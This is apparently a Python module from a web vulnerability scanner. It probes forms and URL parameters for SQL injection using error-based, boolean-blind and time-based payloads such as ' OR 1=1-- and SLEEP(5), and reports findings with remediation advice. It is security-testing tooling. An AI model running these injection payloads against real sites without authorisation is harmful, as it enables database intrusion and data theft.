"""
SQL Injection Testing Module
Tests every form input and URL parameter discovered in Phase 3.

Three techniques in order of reliability:
  1. Error-based  — provoke SQL errors with quotes/operators
  2. Boolean-blind — compare true/false responses for behavioural differences
  3. Time-based   — inject SLEEP() calls and measure response time

The module is careful:
  - Only injects one parameter at a time (others use safe defaults)
  - Compares against a baseline response to reduce false positives
  - Stops after the first confirmed injection per parameter
"""
import asyncio
import time
import re
from typing import List, Dict, Optional, Any
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
import yaml
import httpx
from loguru import logger
from core.engine import BaseModule


# SQL error signatures by database — any match = confirmed error-based SQLi
SQL_ERROR_SIGNATURES = {
    "MySQL":      [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"supplied argument is not a valid mysql",
        r"unclosed quotation mark",
    ],
    "PostgreSQL": [
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"postgresql.*error",
        r"supplied argument is not a valid postgresql",
        r"unterminated quoted string",
    ],
    "MSSQL":      [
        r"microsoft.*odbc.*sql server",
        r"incorrect syntax near",
        r"unclosed quotation mark after the character string",
        r"microsoft ole db provider for sql server",
        r"odbc sql server driver",
    ],
    "Oracle":     [
        r"ora-\d{5}",
        r"oracle.*driver",
        r"warning.*oci_",
        r"quoted string not properly terminated",
    ],
    "SQLite":     [
        r"sqlite_",
        r"sqlite error",
        r"sqlite3",
        r"unrecognized token",
    ],
    "Generic":    [
        r"sql syntax",
        r"sql error",
        r"database error",
        r"query failed",
        r"division by zero",
    ],
}

# Time threshold for time-based injection (seconds)
TIME_THRESHOLD = 4.0
SLEEP_DURATION = 5


class SQLiModule(BaseModule):
    """
    Tests all discovered inputs for SQL injection vulnerabilities.
    Uses the input registry built by FormExtractorModule in Phase 3.
    """
    name = "sqli"
    description = "SQL injection testing — error-based, boolean-blind, time-based"

    def __init__(self, engine):
        super().__init__(engine)
        self.payloads = self._load_payloads()
        self.session_headers = {
            "User-Agent": self.config.scan.user_agents[0],
            "Content-Type": "application/x-www-form-urlencoded",
        }

    def _load_payloads(self) -> Dict[str, List[str]]:
        try:
            with open("payloads/sqli.yaml") as f:
                return yaml.safe_load(f)
        except Exception as e:
            logger.warning(f"[SQLi] Could not load payloads: {e}")
            return {
                "error_based": ["'", "\"", "' OR '1'='1'--", "' OR 1=1--"],
                "blind_boolean": ["' AND 1=1--", "' AND 1=2--"],
                "time_based": [f"' AND SLEEP({SLEEP_DURATION})--"],
            }

    async def run(self) -> List[dict]:
        findings = []

        # Get input registry from Phase 3
        registry = getattr(self.engine, "input_registry", None)
        if not registry:
            logger.warning("[SQLi] No input registry found — run scanner phase first")
            # Fall back: test the target URL itself
            registry = {"forms": [], "url_params": []}

        logger.info(
            f"[SQLi] Testing {len(registry['forms'])} forms and "
            f"{len(registry['url_params'])} URL parameter sets"
        )

        # Test all form inputs
        for form in registry["forms"]:
            form_findings = await self._test_form(form)
            findings.extend(form_findings)

        # Test all URL parameters
        for param_info in registry["url_params"]:
            param_findings = await self._test_url_param(param_info)
            findings.extend(param_findings)

        logger.success(f"[SQLi] Testing complete — {len(findings)} SQLi findings")
        return findings

    async def _test_form(self, form: Dict) -> List[dict]:
        """Test each text input in a form for SQL injection."""
        findings = []
        text_inputs = form.get("text_inputs", [])
        if not text_inputs:
            return findings

        logger.debug(f"[SQLi] Testing form: {form['method']} {form['action']}")

        for target_input in text_inputs:
            param_name = target_input["name"]
            logger.debug(f"[SQLi] Testing parameter: {param_name}")

            # Get baseline response with safe values
            baseline = await self._get_baseline(
                form["action"], form["method"],
                {i["name"]: i.get("value", "test") for i in form["all_inputs"]}
            )
            if not baseline:
                continue

            # --- Phase A: Error-based ---
            finding = await self._test_error_based(
                form["action"], form["method"],
                form["all_inputs"], param_name, baseline
            )
            if finding:
                findings.append(finding)
                continue  # confirmed — no need for further testing on this param

            # --- Phase B: Boolean-blind ---
            finding = await self._test_boolean_blind(
                form["action"], form["method"],
                form["all_inputs"], param_name, baseline
            )
            if finding:
                findings.append(finding)
                continue

            # --- Phase C: Time-based (slowest, run last) ---
            finding = await self._test_time_based(
                form["action"], form["method"],
                form["all_inputs"], param_name
            )
            if finding:
                findings.append(finding)

        return findings

    async def _test_url_param(self, param_info: Dict) -> List[dict]:
        """Test a single URL parameter for SQL injection."""
        findings = []
        base_url = param_info["base_url"]
        param = param_info["param"]

        logger.debug(f"[SQLi] Testing URL param: {param} on {base_url}")

        baseline = await self._get_baseline_url(f"{base_url}?{param}=test")
        if not baseline:
            return findings

        # Error-based
        for payload in self.payloads.get("error_based", [])[:8]:
            result = await self._send_url_request(base_url, param, payload)
            if result:
                db_type, matched = self._detect_sql_error(result["body"])
                if matched:
                    findings.append(self._make_sqli_finding(
                        url=f"{base_url}?{param}={payload}",
                        parameter=param,
                        payload=payload,
                        technique="Error-based",
                        db_type=db_type,
                        evidence=matched,
                        cvss=9.8,
                    ))
                    return findings

        # Time-based
        for payload in self.payloads.get("time_based", [])[:3]:
            result = await self._send_url_request(
                base_url, param, payload, measure_time=True
            )
            if result and result.get("duration", 0) >= TIME_THRESHOLD:
                findings.append(self._make_sqli_finding(
                    url=f"{base_url}?{param}={payload}",
                    parameter=param,
                    payload=payload,
                    technique="Time-based blind",
                    db_type="Unknown (time-based)",
                    evidence=f"Response delayed {result['duration']:.1f}s (threshold: {TIME_THRESHOLD}s)",
                    cvss=9.1,
                ))
                return findings

        return findings

    async def _get_baseline(
        self, url: str, method: str, data: Dict
    ) -> Optional[Dict]:
        """Fetch a normal response to use as comparison baseline."""
        try:
            async with httpx.AsyncClient(
                timeout=self.engine.timeout,
                follow_redirects=True,
                verify=False,
                headers=self.session_headers
            ) as client:
                if method == "POST":
                    resp = await client.post(url, data=data)
                else:
                    resp = await client.get(url, params=data)

                return {
                    "status_code":    resp.status_code,
                    "body":           resp.text,
                    "body_length":    len(resp.text),
                    "content_type":   resp.headers.get("content-type", ""),
                }
        except Exception as e:
            logger.debug(f"[SQLi] Baseline fetch failed for {url}: {e}")
            return None

    async def _get_baseline_url(self, url: str) -> Optional[Dict]:
        try:
            async with httpx.AsyncClient(
                timeout=self.engine.timeout,
                follow_redirects=True,
                verify=False,
            ) as client:
                resp = await client.get(url)
                return {
                    "status_code":  resp.status_code,
                    "body":         resp.text,
                    "body_length":  len(resp.text),
                }
        except Exception:
            return None

    async def _test_error_based(
        self,
        url: str,
        method: str,
        all_inputs: List[Dict],
        target_param: str,
        baseline: Dict,
    ) -> Optional[dict]:
        """
        Inject SQL error payloads one at a time.
        Scan response body for known database error strings.
        """
        for payload in self.payloads.get("error_based", []):
            data = self._build_payload_data(all_inputs, target_param, payload)
            result = await self._send_form_request(url, method, data)
            if not result:
                continue

            db_type, matched_error = self._detect_sql_error(result["body"])
            if matched_error:
                logger.warning(
                    f"[SQLi] ERROR-BASED confirmed! Param: {target_param} | "
                    f"DB: {db_type} | Payload: {payload[:40]}"
                )
                return self._make_sqli_finding(
                    url=url,
                    parameter=target_param,
                    payload=payload,
                    technique="Error-based",
                    db_type=db_type,
                    evidence=f"DB error in response: '{matched_error[:200]}'",
                    cvss=9.8,
                )

        return None

    async def _test_boolean_blind(
        self,
        url: str,
        method: str,
        all_inputs: List[Dict],
        target_param: str,
        baseline: Dict,
    ) -> Optional[dict]:
        """
        Inject TRUE/FALSE pairs and compare response sizes.
        A significant difference in content length = likely blind SQLi.
        """
        boolean_pairs = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR 1=1--",  "' OR 1=2--"),
            ("1 AND 1=1",   "1 AND 1=2"),
        ]

        for true_payload, false_payload in boolean_pairs:
            data_true  = self._build_payload_data(all_inputs, target_param, true_payload)
            data_false = self._build_payload_data(all_inputs, target_param, false_payload)

            result_true  = await self._send_form_request(url, method, data_true)
            result_false = await self._send_form_request(url, method, data_false)

            if not result_true or not result_false:
                continue

            len_true     = result_true["body_length"]
            len_false    = result_false["body_length"]
            len_baseline = baseline["body_length"]

            # True matches baseline, false differs significantly = boolean SQLi
            baseline_diff  = abs(len_true  - len_baseline)
            condition_diff = abs(len_true  - len_false)

            if condition_diff > 50 and baseline_diff < 30:
                logger.warning(
                    f"[SQLi] BOOLEAN-BLIND confirmed! Param: {target_param} | "
                    f"TRUE len={len_true} FALSE len={len_false}"
                )
                return self._make_sqli_finding(
                    url=url,
                    parameter=target_param,
                    payload=true_payload,
                    technique="Boolean-blind",
                    db_type="Unknown (blind)",
                    evidence=(
                        f"TRUE response: {len_true} bytes | "
                        f"FALSE response: {len_false} bytes | "
                        f"Difference: {condition_diff} bytes"
                    ),
                    cvss=9.1,
                )

        return None

    async def _test_time_based(
        self,
        url: str,
        method: str,
        all_inputs: List[Dict],
        target_param: str,
    ) -> Optional[dict]:
        """
        Inject SLEEP() payloads and measure response time.
        If response takes significantly longer than baseline = time-based SQLi.
        """
        for payload in self.payloads.get("time_based", [])[:4]:
            data = self._build_payload_data(all_inputs, target_param, payload)

            start = time.monotonic()
            result = await self._send_form_request(
                url, method, data,
                timeout=SLEEP_DURATION + 10  # allow extra time for sleep
            )
            elapsed = time.monotonic() - start

            if result and elapsed >= TIME_THRESHOLD:
                logger.warning(
                    f"[SQLi] TIME-BASED confirmed! Param: {target_param} | "
                    f"Elapsed: {elapsed:.1f}s | Payload: {payload[:40]}"
                )
                return self._make_sqli_finding(
                    url=url,
                    parameter=target_param,
                    payload=payload,
                    technique="Time-based blind",
                    db_type="Unknown (time-based)",
                    evidence=(
                        f"Response delayed {elapsed:.1f}s after injecting "
                        f"SLEEP({SLEEP_DURATION}). Threshold: {TIME_THRESHOLD}s."
                    ),
                    cvss=9.1,
                )

        return None

    async def _send_form_request(
        self,
        url: str,
        method: str,
        data: Dict,
        timeout: int = None,
    ) -> Optional[Dict]:
        try:
            t = timeout or self.engine.timeout
            async with httpx.AsyncClient(
                timeout=t,
                follow_redirects=True,
                verify=False,
                headers=self.session_headers,
            ) as client:
                if method == "POST":
                    resp = await client.post(url, data=data)
                else:
                    resp = await client.get(url, params=data)

                return {
                    "status_code": resp.status_code,
                    "body":        resp.text.lower(),
                    "body_length": len(resp.text),
                }
        except httpx.TimeoutException:
            # Timeout itself can confirm time-based injection
            return {"status_code": 0, "body": "", "body_length": 0, "timed_out": True}
        except Exception as e:
            logger.debug(f"[SQLi] Request error: {e}")
            return None

    async def _send_url_request(
        self,
        base_url: str,
        param: str,
        payload: str,
        measure_time: bool = False,
    ) -> Optional[Dict]:
        try:
            url = f"{base_url}?{param}={payload}"
            start = time.monotonic()
            async with httpx.AsyncClient(
                timeout=SLEEP_DURATION + 10,
                follow_redirects=True,
                verify=False,
            ) as client:
                resp = await client.get(url)
                duration = time.monotonic() - start
                return {
                    "status_code": resp.status_code,
                    "body":        resp.text.lower(),
                    "body_length": len(resp.text),
                    "duration":    duration,
                }
        except httpx.TimeoutException:
            return {"status_code": 0, "body": "", "body_length": 0,
                    "duration": SLEEP_DURATION + 10, "timed_out": True}
        except Exception:
            return None

    def _build_payload_data(
        self,
        all_inputs: List[Dict],
        target_param: str,
        payload: str
    ) -> Dict[str, str]:
        """
        Build a form data dict where the target parameter has the payload
        and all other fields have safe default values.
        """
        data = {}
        for inp in all_inputs:
            if inp["name"] == target_param:
                data[inp["name"]] = payload
            else:
                # Safe defaults by input type
                safe_defaults = {
                    "password": "SafePass123!",
                    "email":    "test@test.com",
                    "number":   "1",
                    "hidden":   inp.get("value", ""),
                }
                data[inp["name"]] = safe_defaults.get(
                    inp.get("type", "text"),
                    inp.get("value", "test")
                )
        return data

    def _detect_sql_error(self, body: str) -> tuple[str, str]:
        """
        Scan the response body for known SQL error patterns.
        Returns (db_type, matched_snippet) or ("", "").
        """
        body_lower = body.lower()
        for db_type, patterns in SQL_ERROR_SIGNATURES.items():
            for pattern in patterns:
                match = re.search(pattern, body_lower)
                if match:
                    # Return surrounding context for evidence
                    start = max(0, match.start() - 30)
                    end   = min(len(body_lower), match.end() + 80)
                    return db_type, body_lower[start:end].strip()
        return "", ""

    def _make_sqli_finding(
        self,
        url: str,
        parameter: str,
        payload: str,
        technique: str,
        db_type: str,
        evidence: str,
        cvss: float,
    ) -> dict:
        return {
            "title":        f"SQL Injection — {technique} ({parameter})",
            "severity":     "critical",
            "vuln_type":    "sqli",
            "url":          url,
            "parameter":    parameter,
            "payload_used": payload,
            "description": (
                f"SQL injection was confirmed in parameter '{parameter}' using "
                f"{technique} technique. Database: {db_type}.\n\n"
                f"An attacker can use this to:\n"
                f"  • Read all data in the database (user credentials, PII, payment data)\n"
                f"  • Bypass authentication entirely\n"
                f"  • Modify or delete database records\n"
                f"  • Potentially execute OS commands (if DB runs as root/sa)"
            ),
            "evidence":     evidence,
            "remediation": (
                "1. Use parameterized queries (prepared statements) — NEVER string concatenation.\n"
                "2. Use an ORM (Django ORM, SQLAlchemy, Hibernate) which handles this automatically.\n"
                "3. Validate and whitelist all input types.\n"
                "4. Apply least-privilege to the database account.\n"
                "5. Deploy a WAF as a secondary defence.\n\n"
                "Example (Python):\n"
                "  WRONG:  cursor.execute(f\"SELECT * FROM users WHERE id={user_id}\")\n"
                "  CORRECT: cursor.execute(\"SELECT * FROM users WHERE id=%s\", (user_id,))"
            ),
            "cvss_score":   cvss,
            "references": [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                "https://cwe.mitre.org/data/definitions/89.html",
            ],
            "confirmed":        True,
            "is_false_positive": False,
        }
    
    